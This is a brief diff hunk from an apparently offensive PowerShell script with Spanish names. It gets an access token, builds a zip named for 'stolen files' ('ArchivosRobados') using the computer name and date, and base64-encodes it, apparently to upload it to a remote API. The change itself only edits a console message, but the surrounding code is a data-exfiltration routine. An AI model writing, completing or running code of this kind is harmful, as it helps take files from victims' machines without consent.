@@ -173,7 +173,7 @@ $accessToken = (Invoke-RestMethod @params).access_token
 $ArchivosRobados = "$env:computername-$(get-date -f yyyy-MM-dd)"
 $FileEncrypted = 'c:\temp\ArchivosRobados-"$ArchivosRobados".zip'
 
-Write-Host "Ruta de archivos Robados: $FileEncrypted" -ForegroundColor Red
+Write-Host "Nombre de archivos Robados: $ArchivosRobados" -ForegroundColor Green
 
 # Get the source file contents and details, encode in base64
 $sourceItem = Get-Item $FileEncrypted
